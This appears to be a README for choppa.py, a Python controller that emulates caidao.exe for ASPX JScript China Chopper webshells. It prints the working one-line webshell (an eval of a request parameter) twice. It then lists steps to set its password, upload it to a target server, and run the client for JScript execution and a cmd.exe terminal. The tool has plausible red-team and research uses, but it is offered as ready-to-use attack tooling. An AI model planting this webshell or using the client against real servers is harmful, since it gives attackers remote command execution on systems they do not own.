
# choppa.py

choppa.py is a python implementation of caidao.exe, which includes minimal implementations
of caidao.exe's features exclusively for ASPX Jscript variants of China Chopper webshells such as:

```js
<script language="JScript" runat="server">function Page_Load(){eval(Request["password"],"unsafe");}</script>
```

Emulated caidao.exe features include:
- inline Jscript execution
- Virtual terminal emulation with Jscript and cmd.exe /c

choppa.py is not fully featured, and does not include file upload/download or support
for other webshell types referenced in caidao.exe such as ASP and PHP. These features are subject 
to future implementations.

#########################
INSTRUCTIONS:
#########################
1. Change webshell password

<script language="JScript" runat="server">function Page_Load(){eval(Request["Nonqjbexznaoynzrfuvfgbbyf"],"unsafe");}</script>

2. Upload ASPX webshell on target
3. python choppa.py -p Nonqjbexznaoynzrfuvfgbbyf -m MODE
